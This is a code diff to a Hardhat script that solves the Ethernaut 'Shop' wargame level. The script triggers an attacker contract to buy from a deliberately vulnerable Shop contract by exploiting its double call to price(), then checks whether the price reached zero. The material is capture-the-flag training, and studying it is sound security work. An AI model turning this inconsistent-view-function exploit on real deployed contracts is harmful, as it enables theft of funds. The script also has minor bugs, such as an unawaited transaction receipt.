@@ -4,19 +4,26 @@ import { ethers } from "hardhat";
 
 const attackShop = async () => {
     // change contract addresses here.
-    const _shopAddr /*Shop instance address*/ = "0xF675Be946818f77Ba00aD069C99C97080800656E";
-    const attackShopBuyerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
+    const _shopAddr /*Shop instance address*/ = "0x36Db16f376127CfBCDD77F672B9aB77CF8F127b0";
+    const attackShopBuyerAddress = "0xd643B0403958543e445e16dC720566E0D7e11f8a";
 
     // Don't touch below
-    // Exploit comes from no check for underflow on retract function and changing storage value for owner
+    // Exploit comes from two checks of price() and you can change value of second check
     // You may read more on:
     // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions
-    const ABI = ["function buyFromShop(address _shopAddr)"];
-    const contract = await ethers.getContractAt(ABI, attackShopBuyerAddress);
-    const tx = await contract.buyFromShop(_shopAddr);
+    const ABI1 = ["function buyFromShop(address _shopAddr)"];
+    const ABI2 = ["function price() external view returns (uint);"]; //TODO: replace this to fix output
+    const contractAttack = await ethers.getContractAt(ABI1, attackShopBuyerAddress);
+    const tx = await contractAttack.buyFromShop(_shopAddr);
     const txReceipt = tx.wait(1);
-    const Output = txReceipt.toString();
-    console.log(Output);
+    console.log(txReceipt);
+    const contractShop = await ethers.getContractAt(ABI2, _shopAddr);
+    const Output = (await contractShop.price()).toString();
+    if (Output === "0") {
+        console.log("Level passed, Submit to ethernaut");
+    } else {
+        console.log("Please review code above and try again");
+    }
 };
 
 attackShop()
